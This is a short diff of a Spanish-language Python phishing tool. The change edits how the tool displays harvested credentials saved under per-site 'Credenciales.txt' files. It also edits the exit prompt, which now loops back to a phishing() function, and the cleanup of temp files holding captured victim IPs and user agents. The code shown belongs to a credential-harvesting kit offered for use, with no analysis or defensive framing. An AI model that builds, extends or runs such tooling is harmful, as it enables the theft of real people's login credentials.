@@ -282,6 +282,8 @@ Ver credenciales de:
                             b = a.read()
                             print(f"\n[{sitio.capitalize()}]")
                             print(b)
+                            print(f"Credenciales guardadas en /paginas/{sitio}/Credenciales.txt")
+                            print("\nPresiona CTRL + C para salir")
                             os.system("rm -rf temporal.txt")
                             os.system("rm -rf IP.txt")
                             os.system("rm -rf AGENTE.txt")
@@ -292,10 +294,10 @@ Ver credenciales de:
                 except KeyboardInterrupt:
                     try:
                         def respuesta():
-                            respuesta1 = input(f"\nDesea dejar los servicios en segundo plano?(Las credenciales se guardan en /paginas/{sitio}/Credenciales.txt) S/n: ")
-                            if respuesta1 == "S" or respuesta1 == "s":
-                                exit()   
+                            respuesta1 = input(f"\nDesea salir?(Las credenciales se guardan en /paginas/{sitio}/Credenciales.txt) S/n: ")
                             if respuesta1 == "N" or respuesta1 == "n":
+                                return phishing()   
+                            if respuesta1 == "S" or respuesta1 == "s":
                                 os.system("rm -rf temporal.txt")
                                 os.system("rm -rf IP.txt")
                                 os.system("rm -rf AGENTE.txt")
